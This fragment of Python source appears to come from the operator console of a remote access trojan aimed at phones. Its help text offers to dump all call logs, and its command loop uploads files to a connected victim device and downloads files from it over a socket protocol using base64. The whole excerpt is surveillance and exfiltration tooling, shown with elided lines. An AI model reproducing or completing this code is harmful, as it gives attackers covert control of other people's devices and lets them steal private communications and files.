...
def help():
    print("getCallLogs - get all call logs"
          ...
          "\nupload <local file path> <target upload destination>"
    ...
    while sessionAlive:
        ...
        if shellCmd.startswith("upload"):
            try:
                ...
                targetFilePath = shellCmd.split(" ")[2].strip()
            except:
                print("[ Error ] Wrong data format (Enter full Path)")
            if os.path.isfile(filePath):
                fileData = encodeFileData(filePath).decode("UTF-8")
                fileName = filePath.split("/")[-1]
                print("[ info ] Uploading...")
                stable_send(client, f"upload<!>{fileName}<!>{fileData}<!>{targetFilePath}")
                res = stable_recv(client)
                print(res)
            else:
                print("[ Error ] File doesn't exist !")

        elif shellCmd.startswith("download"):
            try:
                filePath = shellCmd.split(" ")[1].strip()
            except:
            ...
            stable_send(client, "download" + "<!>" + filePath)
            res = stable_recv(client)
            if "Error" not in res:
                rawData = base64.b64decode(res)
                with open(filePath.split("/")[-1], "wb") as f:
                    f.write(rawData)
                print("[ info ] Success downloading file at " + dumpPath + filePath.split("/")[-1])
            else:
                print(res)
